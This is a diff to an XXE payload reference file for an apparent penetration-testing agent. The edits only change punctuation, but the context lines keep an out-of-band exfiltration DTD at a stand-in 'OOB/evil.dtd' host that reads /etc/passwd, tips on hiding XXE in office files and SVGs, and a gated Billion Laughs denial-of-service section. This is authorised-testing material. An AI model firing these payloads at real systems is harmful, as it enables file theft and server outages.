@@ -1,4 +1,4 @@
-# payloads — xxe-hunter
+# payloads - xxe-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Completo de Segurança e Testes em Ataques XXE.md` (Section 5: PAYLOADS / PROBES)
 
@@ -8,7 +8,7 @@ without explicit `destructive_testing: approved` in `security-scope.yaml`.
 
 ---
 
-## Detection — Is DTD Processing Enabled?
+## Detection - Is DTD Processing Enabled?
 
 Minimal probe. If the parser returns the entity value inside the response,
 DTD processing is on.
@@ -91,7 +91,7 @@ If the server returns credentials in the response, escalate to
 When the application does not reflect parsed XML content, exfiltrate
 file content via an attacker-controlled external DTD.
 
-### Step 1 — Host this DTD at `http://OOB/evil.dtd`:
+### Step 1 - Host this DTD at `http://OOB/evil.dtd`:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -100,7 +100,7 @@ file content via an attacker-controlled external DTD.
 %exfil;
 ```
 
-### Step 2 — Send this XML to the target:
+### Step 2 - Send this XML to the target:
 
 ```xml
 <?xml version="1.0"?>
@@ -138,7 +138,7 @@ Use when user-supplied XML is inserted into a larger server-side document
 </foo>
 ```
 
-XInclude bypasses DTD restrictions — the application must explicitly
+XInclude bypasses DTD restrictions - the application must explicitly
 disable XInclude processing.
 
 ---
@@ -162,9 +162,9 @@ XML parsers lurk inside office-document formats. An XXE payload inside
 any of these files is treated as ordinary XML once the container is
 unzipped server-side:
 
-- `.docx`, `.xlsx`, `.pptx` (OOXML — see `word/document.xml`)
-- `.odt`, `.ods` (OpenDocument — see `content.xml`)
-- `.svg` (reaches XML parser directly — try the classic payload above)
+- `.docx`, `.xlsx`, `.pptx` (OOXML - see `word/document.xml`)
+- `.odt`, `.ods` (OpenDocument - see `content.xml`)
+- `.svg` (reaches XML parser directly - try the classic payload above)
 - `.xml.gz`, `.xml.zip` (compressed XML)
 - `.pdf` (XFA forms often parse XML)
 
@@ -202,7 +202,7 @@ Works when general entities are blocked but parameter entities are not.
 ## Gated: Denial-of-Service (Billion Laughs)
 
 Expands an entity into trillions of bytes, exhausting server memory.
-**Requires `destructive_testing: approved`** — do not send unprompted.
+**Requires `destructive_testing: approved`** - do not send unprompted.
 
 ```xml
 <?xml version="1.0"?>
@@ -226,7 +226,7 @@ Expands an entity into trillions of bytes, exhausting server memory.
 ```
 
 An error message frequently reveals the parser (libxml2, Xerces,
-MSXML6, etc.) — useful for tuning subsequent probes.
+MSXML6, etc.) - useful for tuning subsequent probes.
 
 ---
 
